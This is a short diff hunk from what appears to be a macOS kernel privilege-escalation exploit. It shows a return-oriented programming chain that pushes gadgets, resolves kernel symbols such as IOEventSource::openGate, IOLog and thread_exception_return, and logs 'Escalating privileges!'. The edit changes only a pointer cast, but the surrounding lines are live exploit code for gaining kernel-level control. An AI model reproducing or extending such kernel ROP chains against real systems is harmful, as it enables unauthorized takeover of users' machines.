@@ -248,7 +248,7 @@ again:;
     PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack,mapping_kernel);
     PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "__ZN13IOEventSource8openGateEv");
     
-    PUSH_GADGET(stack) = ROP_ARG1(stack, mapping_kernel, (char*)"Escalating privileges! -qwertyoruiop\n")
+    PUSH_GADGET(stack) = ROP_ARG1(stack, mapping_kernel, (uint64_t)"Escalating privileges! -qwertyoruiop\n")
     PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_IOLog");
 
     PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_thread_exception_return");
